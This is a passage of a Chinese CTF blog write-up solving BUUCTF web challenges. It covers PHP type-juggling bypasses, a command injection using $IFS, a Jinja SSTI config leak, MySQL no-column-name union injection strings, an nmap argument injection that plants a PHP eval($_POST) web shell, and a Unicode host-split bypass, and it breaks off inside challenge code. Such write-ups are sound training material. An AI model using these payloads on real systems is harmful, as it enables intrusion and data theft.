<!DOCTYPE html>
<html itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
  <head>
    
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
    <meta name="robots" content="noodp" />
    <title>BUU_WEB刷题_0x30-0x3F - Ghostasky&#39;s Blog</title><meta name="author" content="">
<meta name="author-link" content="">
<meta name="description" content="" /><meta itemprop="name" content="BUU_WEB刷题_0x30-0x3F">
<meta itemprop="description" content=""><meta itemprop="datePublished" content="2021-09-16T00:00:00+00:00" />
<meta itemprop="dateModified" content="2021-09-16T00:00:00+00:00" />
<meta itemprop="wordCount" content="5747">
<meta itemprop="keywords" content="" /><meta property="og:title" content="BUU_WEB刷题_0x30-0x3F" />
<meta property="og:description" content="" />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://ghostasky.github.io/posts/buu-web-0x30-0x3f/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2021-09-16T00:00:00+00:00" />
<meta property="article:modified_time" content="2021-09-16T00:00:00+00:00" />
<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="BUU_WEB刷题_0x30-0x3F"/>
<meta name="twitter:description" content=""/>
<meta name="application-name" content="FixIt">
<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="http://ghostasky.github.io/posts/buu-web-0x30-0x3f/" /><link rel="prev" href="http://ghostasky.github.io/posts/buu-web-0x20-0x2f/" /><link rel="next" href="http://ghostasky.github.io/posts/io_file/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
  {
    "@context": "http://schema.org",
    "@type": "BlogPosting",
    "headline": "BUU_WEB刷题_0x30-0x3F",
    "inLanguage": "zh-CN",
    "mainEntityOfPage": {
      "@type": "WebPage",
      "@id": "http:\/\/ghostasky.github.io\/posts\/buu-web-0x30-0x3f\/"
    },"genre": "posts","wordcount":  5747 ,
    "url": "http:\/\/ghostasky.github.io\/posts\/buu-web-0x30-0x3f\/","datePublished": "2021-09-16T00:00:00+00:00","dateModified": "2021-09-16T00:00:00+00:00","publisher": {
      "@type": "Organization",
      "name": ""},"author": {
        "@type": "Person",
        "name": "作者"
      },"description": ""
  }
  </script></head>
  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
  <div class="header-wrapper">
    <div class="header-title">
      <a href="/" title="Ghostasky&#39;s Blog"><img loading="lazy" src="/images/fixit.png" alt="Ghostasky&#39;s Blog" data-title="Ghostasky&#39;s Blog" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-text">Ghostasky&#39;s Blog</span></a><span class="header-subtitle"></span></div>
    <nav>
      <ul class="menu"><li class="menu-item">
              <a
                class="menu-link"
                href="/posts/"
                
                
              >文章</a></li><li class="menu-item">
              <a
                class="menu-link"
                href="/categories/"
                
                
              >分类</a></li><li class="menu-item">
              <a
                class="menu-link"
                href="/tags/"
                
                
              >标签</a></li><li class="menu-item">
              <a
                class="menu-link"
                href="/about/"
                
                
              >关于</a></li><li class="menu-item delimiter"></li><li class="menu-item theme-switch" title="切换主题">
          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
        </li></ul>
    </nav>
  </div>
</header><header class="mobile animate__faster" id="header-mobile">
  <div class="header-container">
    <div class="header-wrapper">
      <div class="header-title">
        <a href="/" title="Ghostasky&#39;s Blog"><img loading="lazy" src="/images/fixit.png" alt="/images/fixit.png" data-title="/images/fixit.png" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-text">Ghostasky&#39;s Blog</span></a><span class="header-subtitle"></span></div>
      <div class="menu-toggle" id="menu-toggle-mobile">
        <span></span><span></span><span></span>
      </div>
    </div>
    <nav>
      <ul class="menu" id="menu-mobile"><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/posts/"
                  
                  
                >文章</a></li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/categories/"
                  
                  
                >分类</a></li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/tags/"
                  
                  
                >标签</a></li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/about/"
                  
                  
                >关于</a></li><li class="menu-item menu-system">
          <span class="menu-system-item theme-switch" title="切换主题"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
      </ul>
    </nav>
  </div>
</header><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="合集"></aside>

  <article class="page single">
    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>BUU_WEB刷题_0x30-0x3F</span>
      </h1></div><div class="post-meta">
      <div class="post-meta-line"><span class="post-author"><span class="author"><i class="fa-solid fa-user-circle" aria-hidden="true"></i>
      Anonymous</span></span></div><div class="post-meta-line"><span title="发布于 2021-09-16 00:00:00"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2021-09-16">2021-09-16</time></span>&nbsp;<span title="5747 字"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>约 5800 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>预计阅读 12 分钟</span>&nbsp;</div>
    </div><div class="details toc" id="toc-static" data-kept="false">
        <div class="details-summary toc-title">
          <span>目录</span>
          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
        </div>
        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#0x30wustctf2020朴实无华审计">0x30.[WUSTCTF2020]朴实无华(审计)</a></li>
    <li><a href="#0x31westernctf2018shrinessti">0x31.[WesternCTF2018]shrine(SSTI)</a></li>
    <li><a href="#0x32swpu2019web1无列名注入">0x32.[SWPU2019]Web1(无列名注入)</a></li>
    <li><a href="#0x33网鼎杯-2020-朱雀组nmap">0x33.[网鼎杯 2020 朱雀组]Nmap</a></li>
    <li><a href="#0x34suctf-2019pythonginx">0x34.[SUCTF 2019]Pythonginx</a></li>
    <li><a href="#0x35mrctf2020pywebsite">0x35.[MRCTF2020]PYWebsite</a></li>
    <li><a href="#0x36极客大挑战-2019finalsql盲注">0x36.[极客大挑战 2019]FinalSQL(盲注)</a></li>
    <li><a href="#0x37mrctf2020ezpop">0x37.[MRCTF2020]Ezpop</a></li>
    <li><a href="#0x38npuctf2020readlezphp">0x38.[NPUCTF2020]ReadlezPHP</a></li>
    <li><a href="#0x39ciscn2019-华东南赛区web11ssti">0x39.[CISCN2019 华东南赛区]Web11(SSTI)</a></li>
    <li><a href="#0x3abjdctf2020easysearch">0x3A.[BJDCTF2020]EasySearch</a></li>
    <li><a href="#0x3bbsidescf-2019futurella">0x3B.[BSidesCF 2019]Futurella</a></li>
    <li><a href="#0x3cgyctf2020flaskapp">0x3C.[GYCTF2020]FlaskApp</a></li>
    <li><a href="#0x3dbsidescf-2019kookie">0x3D.[BSidesCF 2019]Kookie</a></li>
    <li><a href="#0x3e极客大挑战-2019rce-me">0x3E.[极客大挑战 2019]RCE ME</a></li>
    <li><a href="#0x3fmrctf2020套娃">0x3F.[MRCTF2020]套娃</a></li>
  </ul>
</nav></div>
      </div><div class="content" id="content"><p>[toc]</p>
<h2 id="0x30wustctf2020朴实无华审计" class="heading-element">
  <a href="#0x30wustctf2020%e6%9c%b4%e5%ae%9e%e6%97%a0%e5%8d%8e%e5%ae%a1%e8%ae%a1" class="heading-mark"></a>0x30.[WUSTCTF2020]朴实无华(审计)</h2><p>robots找到个文件<code>fAke_f1agggg.php</code>，假的flag，查看头，找到fl4g.php。</p>
<div class="highlight" id="id-1"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nx">header</span><span class="p">(</span><span class="s1">&#39;Content-type:text/html;charset=utf-8&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__file__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">//level 1
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;num&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$num</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;num&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">intval</span><span class="p">(</span><span class="nv">$num</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">2020</span> <span class="o">&amp;&amp;</span> <span class="nx">intval</span><span class="p">(</span><span class="nv">$num</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">2021</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;金钱解决不了穷人的本质问题&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s2">&#34;去非洲吧&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">//level 2
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;md5&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">   <span class="nv">$md5</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;md5&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">   <span class="k">if</span> <span class="p">(</span><span class="nv">$md5</span><span class="o">==</span><span class="nx">md5</span><span class="p">(</span><span class="nv">$md5</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">       <span class="k">echo</span> <span class="s2">&#34;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">   <span class="k">else</span>
</span></span><span class="line"><span class="cl">       <span class="k">die</span><span class="p">(</span><span class="s2">&#34;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s2">&#34;去非洲吧&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">//get flag
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;get_flag&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$get_flag</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;get_flag&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">strstr</span><span class="p">(</span><span class="nv">$get_flag</span><span class="p">,</span><span class="s2">&#34; &#34;</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$get_flag</span> <span class="o">=</span> <span class="nx">str_ireplace</span><span class="p">(</span><span class="s2">&#34;cat&#34;</span><span class="p">,</span> <span class="s2">&#34;wctf2020&#34;</span><span class="p">,</span> <span class="nv">$get_flag</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">system</span><span class="p">(</span><span class="nv">$get_flag</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;快到非洲了&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s2">&#34;去非洲吧&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>其中</p>
<div class="highlight" id="id-2"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$num</span><span class="o">=</span><span class="s1">&#39;1e10&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">intval</span><span class="p">(</span><span class="nv">$num</span><span class="p">);</span>                    <span class="c1">// 1
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">echo</span> <span class="s1">&#39;&lt;/br&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">intval</span><span class="p">(</span><span class="nv">$num</span><span class="o">+</span><span class="mi">1</span><span class="p">);</span>                  <span class="c1">// 1410065409
</span></span></span></code></pre></div><p>那么level1就很好绕过了。level2：弱类型绕过：<code>0e215962017</code></p>
<p>level3过滤了cat，可以使用tac，也过滤了空格，使用<code>$IFS$9</code>绕过</p>
<p>最终payload:<code>num=1e10&amp;md5=0e215962017&amp;get_flag=$IFS1ffffllllaaaggg</code></p>
<h2 id="0x31westernctf2018shrinessti" class="heading-element">
  <a href="#0x31westernctf2018shrinessti" class="heading-mark"></a>0x31.[WesternCTF2018]shrine(SSTI)</h2><div class="highlight" id="id-3"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">flask</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">flask</span><span class="o">.</span><span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s1">&#39;FLAG&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">environ</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="s1">&#39;FLAG&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">open</span><span class="p">(</span><span class="vm">__file__</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/shrine/&lt;path:shrine&gt;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">shrine</span><span class="p">(</span><span class="n">shrine</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">safe_jinja</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">s</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;(&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;)&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">blacklist</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;config&#39;</span><span class="p">,</span> <span class="s1">&#39;self&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="s1">&#39;\{\{\</span><span class="si">% s</span><span class="s1">et </span><span class="si">{}</span><span class="s1">=None%}}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">blacklist</span><span class="p">])</span> <span class="o">+</span> <span class="n">s</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">flask</span><span class="o">.</span><span class="n">render_template_string</span><span class="p">(</span><span class="n">safe_jinja</span><span class="p">(</span><span class="n">shrine</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">debug</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span></span></span></code></pre></div><p><code>{{7*7}}</code>发现有SSTI</p>
<p>注册了一个名字为<code>FLAG</code>的config，同时这个题目把<code>(),config,self</code>都过滤掉了，并且黑名单设置的时候，替换为空。</p>
<p>那么可以使用python的内置函数<code>url_for</code>和<code>get_flashed_messages</code></p>
<p><code>url_for.__globals__</code>发现：<code>'current_app': &lt;Flask 'app'&gt;</code></p>
<p><code>current_app</code>就是当前下的app，接下来查看当前app下的config</p>
<div class="highlight" id="id-4"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="o">/</span><span class="n">shrine</span><span class="o">/</span><span class="p">{{</span><span class="n">url_for</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;current_app&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">config</span><span class="p">}}</span>
</span></span><span class="line"><span class="cl"><span class="ow">or</span> 
</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">shrine</span><span class="o">/</span><span class="p">{{</span><span class="n">url_for</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;current_app&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">config</span><span class="o">.</span><span class="n">FLAG</span><span class="p">}}</span></span></span></code></pre></div><h2 id="0x32swpu2019web1无列名注入" class="heading-element">
  <a href="#0x32swpu2019web1%e6%97%a0%e5%88%97%e5%90%8d%e6%b3%a8%e5%85%a5" class="heading-mark"></a>0x32.[SWPU2019]Web1(无列名注入)</h2><blockquote>
<p><a href="https://www.anquanke.com/post/id/193512"target="_blank" rel="external nofollow noopener noreferrer">https://www.anquanke.com/post/id/193512</a></p>
<p>information_schema被waf，无列名注入</p>
</blockquote>
<div class="highlight" id="id-5"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="err">无列名注入</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">//</span><span class="w"> </span><span class="err">使用这个语句，前面的</span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="err">，</span><span class="mi">2</span><span class="err">，</span><span class="mi">3</span><span class="w"> </span><span class="err">会变成列名。如果此时我们再使用下面的语句</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">slecet</span><span class="w"> </span><span class="mi">2</span><span class="w"> </span><span class="n">form</span><span class="w"> </span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="p">)</span><span class="n">a</span><span class="p">;</span><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">//</span><span class="w"> </span><span class="err">就可以得到我们的第二列的所有数据</span></span></span></code></pre></div><p>通过测试发现过滤了空格，or和注释符号，这样orderby和information_schema都使用不了了。</p>
<p>information_schema使用不了可以使用InnoDb引擎或者sys数据库</p>
<blockquote>
<p>从MYSQL5.5.8开始，InnoDB成为其默认存储引擎。而在MYSQL5.6以上的版本中，inndb增加了innodb_index_stats和innodb_table_stats两张表，这两张表中都存储了数据库和其数据表的信息，但是没有存储列名。</p>
<p>在5.7以上的MYSQL中，新增了sys数据库，该库的基础数据来自information_schema和performance_chema，其本身不存储数据。可以通过其中的schema_auto_increment_columns来获取表名。</p>
<p>sys库需要root权限才能访问。innodb在mysql中是默认关闭的。</p>
</blockquote>
<p>空格可以用内联/**/来绕过</p>
<p>经过测试发现有22个字段，回显在2和3：</p>
<blockquote>
<p>-1&rsquo;/**/UNION/**/SELECT/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'</p>
</blockquote>
<p>比赛中bypass <code>information_schema</code>是用的<code>sys.schema_auto_increment_columns</code>，但是buu平台没有这个库。</p>
<p>还有一个方法：</p>
<p>innodb</p>
<ul>
<li>表引擎为innodb</li>
<li>MySQL&gt; 5.5</li>
<li>innodb_ table_stats、 innodb_table_index存 放所有库名表名</li>
<li><code>select table_name from mysql.innodb_table_stats where database_ name=库名</code>;</li>
</ul>
<p>这个方法在buu也不行。。。</p>
<p>所以只能无列名注入：</p>
<p>使用innodb绕过：</p>
<pre tabindex="0"><code>-1&#39;/**/union/**/select/**/1,2,group_concat(table_name),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/from/**/mysql.innodb_table_stats/**/where/**/database_name=database()&amp;&amp;&#39;1&#39;=&#39;1</code></pre><p>查到有ads和users两张表。</p>
<pre tabindex="0"><code>-1&#39;/**/union/**/select/**/1,(select/**/group_concat(`2`)/**/from/**/(select/**/1,2,3/**/union/**/select*from/**/users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&amp;&amp;&#39;1&#39;=&#39;1</code></pre><p>查看另一列</p>
<pre tabindex="0"><code>-1&#39;/**/union/**/select/**/1,(select/**/group_concat(`3`)/**/from/**/(select/**/1,2,3/**/union/**/select*from/**/users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&amp;&amp;&#39;1&#39;=&#39;1</code></pre><h2 id="0x33网鼎杯-2020-朱雀组nmap" class="heading-element">
  <a href="#0x33%e7%bd%91%e9%bc%8e%e6%9d%af-2020-%e6%9c%b1%e9%9b%80%e7%bb%84nmap" class="heading-mark"></a>0x33.[网鼎杯 2020 朱雀组]Nmap</h2><p>使用的是nmap，提示在/flag中，所以可以写入到文件：</p>
<p><code>' -iL /flag -oN flag.txt '</code></p>
<p>解法二：</p>
<p><code>' &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php '</code></p>
<p>回显了hacker</p>
<p><code>' &lt;?= @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.phtml '</code></p>
<p>可以访问，蚁剑就OK。</p>
<h2 id="0x34suctf-2019pythonginx" class="heading-element">
  <a href="#0x34suctf-2019pythonginx" class="heading-mark"></a>0x34.[SUCTF 2019]Pythonginx</h2><blockquote>
<p>知识点：</p>
<ol>
<li>
<p>blackhat2019的一个议题：https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf</p>
<p>大致就是说假如http://evil.c℀.com经过处理会变成http://evil.ca/c.com</p>
</li>
<li>
<p>在unicode中字符℀(U+2100)，当IDNA处理此字符时，会将℀变成a/c，因此当你访问此url时，dns服务器会自动将url重定向到另一个网站。如果服务器引用前端url时，只对域名做了限制，那么通过这种方法，我们就可以轻松绕过服务器对域名的限制了。</p>
</li>
<li>
<p><strong>CVE-2019-9636：urlsplit不处理NFKC标准化</strong></p>
</li>
<li>
<p>Nginx重要文件的位置</p>
</li>
</ol>
</blockquote>
<pre tabindex="0"><code>nginx重要文件位置
配置文件存放目录：/etc/nginx
主配置文件：/etc/nginx/conf/nginx.conf
管理脚本：/usr/lib64/systemd/system/nginx.service
模块：/usr/lisb64/nginx/modules
应用程序：/usr/sbin/nginx
程序默认存放位置：/usr/share/nginx/html
日志默认存放位置：/var/log/nginx
配置文件目录为：/usr/local/nginx/conf/nginx.conf</code></pre><div class="highlight" id="id-10"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl">        <span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/getUrl&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">getUrl</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">url</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;url&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">host</span> <span class="o">=</span> <span class="n">parse</span><span class="o">.</span><span class="n">urlparse</span><span class="p">(</span><span class="n">url</span><span class="p">)</span><span class="o">.</span><span class="n">hostname</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">host</span> <span class="o">==</span> <span class="s1">&#39;suctf.cc&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;我扌 your problem? 111&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">parts</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">urlsplit</span><span class="p">(</span><span class="n">url</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">host</span> <span class="o">=</span> <span class="n">parts</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">host</span> <span class="o">==</span> <span class="s1">&#39;suctf.cc&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;我扌 your problem? 222 &#34;</span> <span class="o">+</span> <span class="n">host</span>
